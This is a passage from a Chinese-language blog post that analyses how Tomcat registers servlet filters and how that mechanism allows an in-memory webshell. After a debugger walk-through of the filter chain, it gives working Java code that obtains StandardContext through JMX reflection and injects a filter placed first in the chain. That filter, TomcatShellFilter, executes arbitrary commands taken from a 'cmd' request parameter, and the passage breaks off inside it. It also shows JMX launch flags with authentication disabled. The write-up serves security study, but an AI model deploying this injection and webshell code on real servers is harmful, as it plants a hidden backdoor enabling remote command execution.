<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;filter&gt;</span><br><span class="line">    &lt;filter-name&gt;secondFilter&lt;/filter-name&gt;</span><br><span class="line">    &lt;filter-<span class="class"><span class="keyword">class</span>&gt;<span class="title">secondFilter</span>&lt;/<span class="title">filter</span>-<span class="title">class</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">init</span>-<span class="title">param</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">param</span>-<span class="title">name</span>&gt;<span class="title">encoding</span>&lt;/<span class="title">param</span>-<span class="title">name</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">param</span>-<span class="title">value</span>&gt;<span class="title">GB2312</span>&lt;/<span class="title">param</span>-<span class="title">value</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">init</span>-<span class="title">param</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">filter</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">filter</span>-<span class="title">mapping</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">filter</span>-<span class="title">name</span>&gt;<span class="title">secondFilter</span>&lt;/<span class="title">filter</span>-<span class="title">name</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">url</span>-<span class="title">pattern</span>&gt;/<span class="title">HelloWorld</span>&lt;/<span class="title">url</span>-<span class="title">pattern</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">filter</span>-<span class="title">mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>​        secondFilter内容如下</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">secondFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest req, ServletResponse resp, FilterChain chain)</span> <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        chain.doFilter(req, resp);</span><br><span class="line">        PrintWriter out = resp.getWriter();</span><br><span class="line">        out.println(<span class="string">"&lt;h1&gt;secondFilter Test&lt;/h1&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig config)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        debug调试，可以看到进入Helloworld的doGet方法之前先经过了FirstFilter.doFilter再经过了secondFilter.doFilter。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225121140703.png" alt="image-20201225121140703"></p>
<p>​            由于先经过了FirstFilter再经过了secondFilter,因此再返回的时候，先会经过secondFilter的处理，再经过FirstFilter处理，最终执行结果如下：</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225121243273.png" alt="image-20201225121243273"></p>
<p><strong>注解实现过滤器</strong></p>
<p>​        在web.xml中对servlet和过滤器的配置同样可以使用注解实现，对servlet的配置如下：</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225134433759.png" alt="image-20201225134433759"></p>
<p>​        使用@WebFilter注解对两个过滤器进行配置。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225134519636.png" alt="image-20201225134519636"></p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225134526683.png" alt="image-20201225134526683"></p>
<p>​        修改后运行tomcat，发现还是先执行了firstFilter再执行了secondFilter，我们知道在上一个例子中执行过滤器链是因为我们在web.xml中进行配置，这个执行顺序是和<code>&lt;filter-mapping&gt;</code> 的声明顺序有关的，但是在这个例子中并没有在web.xml中进行配置。经过查阅资料，在注解中进行配置和filterName首字母有关，A-Z代表着不同的执行顺序。</p>
<h3 id="如何动态注册Filter"><a href="#如何动态注册Filter" class="headerlink" title="如何动态注册Filter?"></a>如何动态注册Filter?</h3><h4 id="Tomcat中Filter注册流程"><a href="#Tomcat中Filter注册流程" class="headerlink" title="Tomcat中Filter注册流程"></a>Tomcat中Filter注册流程</h4><p>​        在了解如何动态注册Filter之前，我们先看下tomcat是如何注册Filter的，在org.apache.catalina.core.StandardWrapperValve#invoke方法中，会调用createFilterChain方法。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225144929433.png" alt="image-20201225144929433"></p>
<p>​        在org.apache.catalina.core.ApplicationFilterChain#createFilterChain中，会获取当前request对象中是否设置了filterChain，没有设置会创建一个ApplicationFilterChain对象并设置到request对象中。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225145256764.png" alt="image-20201225145256764"></p>
<p>​        继续向下执行，调用org.apache.catalina.core.StandardContext#findFilterMaps,会返回过滤器数组，这个数组中包含两个我们实现的过滤器和一个tomcat自带的过滤器。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225145324041.png" alt="image-20201225145324041"></p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225145355643.png" alt="image-20201225145355643"></p>
<p>​            判断获取的filterMaps中的过滤器是否满足dispatcher和requestpath的条件，均满足后会添加到filterChain中。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225145548170.png" alt="image-20201225145548170"></p>
<p>​        获取到满足条件的filter后，会将满足条件的filterChain返回。继续看org.apache.catalina.core.StandardWrapperValve#invoke方法，会执行filterChains的doFilter方法。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225145909761.png" alt="image-20201225145909761"></p>
<p>​        在org.apache.catalina.core.ApplicationFilterChain#doFilter中会调用internalDoFilter，跟进这个方法，首先获取第一个filter，并执行对应的doFilter方法。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225150035887.png" alt="image-20201225150035887"></p>
<p>​        跟进FirstFilter#doFilter，首先调用ApplicationFilterChain.doFilter(req, resp)</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225150119180.png" alt="image-20201225150119180"></p>
<p>​        ApplicationFilterChain.doFilter中同样会调用internalDoFilter</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225150321470.png" alt="image-20201225150321470"></p>
<p>​            继续调用其他过滤器，这个过滤器是tomcat自带的过滤器。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225150403698.png" alt="image-20201225150403698"></p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225150516874.png" alt="image-20201225150516874"></p>
<p>​        继续执行org.apache.catalina.core.ApplicationFilterChain#internalDoFilter，此时if条件已经不能满足，代表过滤器链已经执行结束了。跳过了if步骤后最终会执行servlet.service方法。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225150630961.png" alt="image-20201225150630961"></p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225150731473.png" alt="image-20201225150731473"></p>
<p>​        分析完这个调用，我们可以分析出这个调用的关键点在于org.apache.catalina.core.StandardContext#findFilterMaps中的filterMaps</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225151110960.png" alt="image-20201225151110960"></p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225151057672.png" alt="image-20201225151057672"></p>
<p>​        我们看一下这个filterMaps[]是在何时被赋值的。在org.apache.catalina.core.StandardContext#addFilterMap中打断点，发现当我们启动项目的时候会被加载。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201225151431915.png" alt="image-20201225151431915"></p>
<p>​        查看上层调用，FilterMap来自于<code>webxml.getFilterMappings()</code></p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228142018334.png" alt="image-20201228142018334"></p>
<p>​        getFilterMappings在webxml.java中，返回filterMaps对象，所以我们得知道filterMaps是在哪里被赋值的。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228142105141.png" alt="image-20201228142105141"></p>
<p>​        经过分析存在addFilterMapping方法，该方法中会为FilterMaps添加内容</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228142153204.png" alt="image-20201228142153204"></p>
<p>​        在addFilterMapping方法打断点，重新启动项目，发现在processAnnotationWebFilter中调用了addFilterMapping添加filterMap，但是在调用addFilterMapping添加filterMap前也会调用addFilter添加filterDef对象。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228143903686.png" alt="image-20201228143903686"></p>
<p>​         查看filterDef和filterMap的内容，filterDef中包含了filterClass内容，而filterMap中包含了urlPatterns等内容，也就是说filterMap是负责url匹配的，其作用是解析web.xml中的<filerMap>标签。而FilterDef中包含Filter的定义和处理这个Filter的类。</filerMap></p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228144126525.png" alt="image-20201228144126525"></p>
<p>​        查看webxml.java中的代码，可以看到filterDef的值会被保存到filters中。filterMap的内容会被保存到filterMaps中。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228150628029.png" alt="image-20201228150628029"></p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228150721604.png" alt="image-20201228150721604"></p>
<p>​        从这里可以看出，如果想要动态创建filter过滤器，只要在filterMaps和filters中添加值就可以了，但是我们在跟踪tomcat filter过滤链加载的过程中，并没有注意到filters是在哪里起作用的，重新查看filter调用过程，发现filter的类是通过filterConfig.getFilter()获取的。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228151816221.png" alt="image-20201228151816221"></p>
<p>​        在filterConfig接口实现类ApplicationFilterConfig中的getFilter方法中，可以看到能否获取到Filter是和filterDef有关系的。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228152128438.png" alt="image-20201228152128438"></p>
<p>​        也就是说理论上来讲我们可以通过获取webxml对象，并修改其中的filters和filterMaps的内容来动态添加filter过滤器的，但是这个webxml对象我们在运行中无法获取到。但是在通过webxml.getFilters()或者webxml.getFilterMappings（）方法获取到FilterDef和filterMap后，会调用StandardContext中的addFilterDef和addFilterMap方法将filter和filterMap赋值给standardContext对象的变量中。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228153406512.png" alt="image-20201228153406512"></p>
<p>​        并且在最终创建过滤链的时候会调用standardContext的findFilterMaps方法来获取filterMaps。所以我们可以通过获取StandardContext对象，并调用其中的addFilterMap和addFilterDef来动态添加filter。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228153855563.png" alt="image-20201228153855563"></p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228153949211.png" alt="image-20201228153949211"></p>
<h4 id="StandardContext注册Filter"><a href="#StandardContext注册Filter" class="headerlink" title="StandardContext注册Filter"></a><strong>StandardContext注册Filter</strong></h4><p>​        JMX(Java Management Extensions)是一套标准，这种机制可以方便的管理、监控正在运行中的Java程序。常用于管理线程，内存，日志Level，服务重启，系统环境等。</p>
<ul>
<li>MBean：是Managed Bean的简称，可以翻译为“管理构件”。在JMX中MBean代表一个被管理的资源实例，通过MBean中暴露的方法和属性，外界可以获取被管理的资源的状态和操纵MBean的行为。</li>
<li>MBeanServer：MBean生存在一个MBeanServer中。MBeanServer管理这些MBean，并且代理外界对它们的访问。并且MBeanServer提供了一种注册机制，是的外界可以通过名字来得到相应的MBean实例。</li>
</ul>
<p><strong>配置Jconsole监控MBean</strong></p>
<p>​        在启动项目时，添加如下参数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-Djava.rmi.server.hostname&#x3D;127.0.0.1 -Dcom.sun.management.jmxremote -Dcom.sun.management.jmxremote.port&#x3D;11911 -Dcom.sun.management.jmxremote.ssl&#x3D;false -Dcom.sun.management.jmxremote.authenticate&#x3D;false</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228113628383.png" alt="image-20201228113628383"></p>
<p>​            启动Jconsole，<code>连接-》新建连接-》Bootstrap进程</code></p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228113730266.png" alt="image-20201228113730266"></p>
<p>​        查看MBean中的内容，在BasicAuthenticator中可以看到其中存在context对象，因此我们可以通过<code>type=Valve,host=localhost,context=/manager,name=BasicAuthenticator</code>来获取Context对象</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228113838455.png" alt="image-20201228113838455"></p>
<p>​        首先获取MBeanServer，代码如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MBeanServer mBeanServer = Registry.getRegistry(<span class="keyword">null</span>, <span class="keyword">null</span>).getMBeanServer();</span><br></pre></td></tr></table></figure>

<p>​        获取mBeanServer后可以通过<code>mBeanServer-》mbsInterceptor属性-》repository属性-》domainTb属性</code>获取所有的MBean对象。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228114652723.png" alt="image-20201228114652723"></p>
<p>​        通过反射调用获取到domainTb。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">            Field field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.JmxMBeanServer"</span>).getDeclaredField(<span class="string">"mbsInterceptor"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Object mbsInterceptor = field.get(mBeanServer);</span><br><span class="line"><span class="comment">// 获取repository</span></span><br><span class="line">            field = Class.forName(<span class="string">"com.sun.jmx.interceptor.DefaultMBeanServerInterceptor"</span>).getDeclaredField(<span class="string">"repository"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Object repository = field.get(mbsInterceptor);</span><br><span class="line"><span class="comment">// 获取domainTb</span></span><br><span class="line">            field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.Repository"</span>).getDeclaredField(<span class="string">"domainTb"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            HashMap&lt;String, Map&lt;String, NamedObject&gt;&gt; domainTb = (HashMap&lt;String,Map&lt;String,NamedObject&gt;&gt;)field.get(repository);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228115336921.png" alt="image-20201228115336921"></p>
<p>​        下一步我们找到<code>Catalina-&gt;context=/manager,host=localhost,name=BasicAuthenticator,type=Valve</code> </p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">NamedObject nonLoginAuthenticator = domainTb.get(<span class="string">"Catalina"</span>).get(<span class="string">"context=/manager,host=localhost,name=BasicAuthenticator,type=Valve"</span>);</span><br><span class="line">field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.NamedObject"</span>).getDeclaredField(<span class="string">"object"</span>);</span><br><span class="line">field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object object = field.get(nonLoginAuthenticator);</span><br></pre></td></tr></table></figure>

<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228115634740.png" alt="image-20201228115634740"></p>
<p>​        从resource中获取Context对象。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228120511795.png" alt="image-20201228120511795"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取resource</span></span><br><span class="line">            field = Class.forName(<span class="string">"org.apache.tomcat.util.modeler.BaseModelMBean"</span>).getDeclaredField(<span class="string">"resource"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Object resource = field.get(object);</span><br><span class="line"><span class="comment">// 获取context</span></span><br><span class="line">            field = Class.forName(<span class="string">"org.apache.catalina.authenticator.AuthenticatorBase"</span>).getDeclaredField(<span class="string">"context"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            StandardContext standardContext = (StandardContext) field.get(resource);</span><br></pre></td></tr></table></figure>

<p>​        当然不止<code>context=/manager,host=localhost,name=BasicAuthenticator,type=Valve</code>可以获得context对象。</p>
<p><img src="/2020/12/24/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/image-20201228120830868.png" alt="image-20201228120830868"></p>
<pre><code>得到StandardContext对象后，调用addFilterDef和addFilterMap添加filterDef和FilterMap。</code></pre><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">FilterDef filterDef = context.findFilterDef(filterName);  <span class="comment">//查看当前的filter中是否包含我们自定义的filter。</span></span><br><span class="line">Filter filter = <span class="keyword">new</span> TomcatShellFilter(); <span class="comment">//创建我们要注入的filter对象</span></span><br><span class="line"><span class="comment">// filterDef</span></span><br><span class="line"><span class="keyword">if</span> (filterDef == <span class="keyword">null</span>) &#123;</span><br><span class="line">    <span class="comment">// Gen filterDef</span></span><br><span class="line">    filterDef = <span class="keyword">new</span> FilterDef(); <span class="comment">//新建FilterDef对象</span></span><br><span class="line">    filterDef.setFilterName(filterName);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    <span class="comment">// Add filterDef</span></span><br><span class="line">    context.addFilterDef(filterDef); <span class="comment">//将filterDef添加到context中。</span></span><br><span class="line">    <span class="comment">// Refresh filterConfigs</span></span><br><span class="line">    context.filterStart();</span><br><span class="line">    <span class="comment">// filterMap</span></span><br><span class="line">    filterMap.setFilterName(filterName);</span><br><span class="line">    filterMap.setDispatcher(String.valueOf(DispatcherType.REQUEST));</span><br><span class="line">    filterMap.addURLPattern(filterUrlPattern);</span><br><span class="line">    context.addFilterMap(filterMap);  <span class="comment">//添加filterMap</span></span><br><span class="line">    <span class="comment">// Order</span></span><br><span class="line">    Object[] filterMaps = context.findFilterMaps();</span><br><span class="line">    Object[] tmpFilterMaps = <span class="keyword">new</span> Object[filterMaps.length]; <span class="comment">//对filterMaps中的内容重新排序，让目标首先经过我们自定义的过滤器。</span></span><br><span class="line">    <span class="keyword">int</span> index = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; filterMaps.length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        FilterMap f = (FilterMap) filterMaps[i];</span><br><span class="line">        <span class="keyword">if</span> (f.getFilterName().equalsIgnoreCase(filterName)) &#123;</span><br><span class="line">            tmpFilterMaps[<span class="number">0</span>] = f;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            tmpFilterMaps[index++] = f;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; filterMaps.length; i++) &#123;</span><br><span class="line">        filterMaps[i] = tmpFilterMaps[i];</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">"Test Add Filter................"</span>);</span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">"add success"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​        TomcatShellFilter的内容如下：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TomcatShellFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * webshell命令参数名</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String cmdParamName = <span class="string">"cmd"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse,</span></span></span><br><span class="line"><span class="function"><span class="params">                         FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        System.out.println(</span><br><span class="line">                <span class="string">"TomcatShellFilter doFilter....................................................................."</span>);</span><br><span class="line">        String cmd;</span><br><span class="line">        <span class="keyword">if</span> ((cmd = servletRequest.getParameter(cmdParamName)) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">            java.io.BufferedReader bufferedReader = <span class="keyword">new</span> java.io.BufferedReader(</span><br><span class="line">                    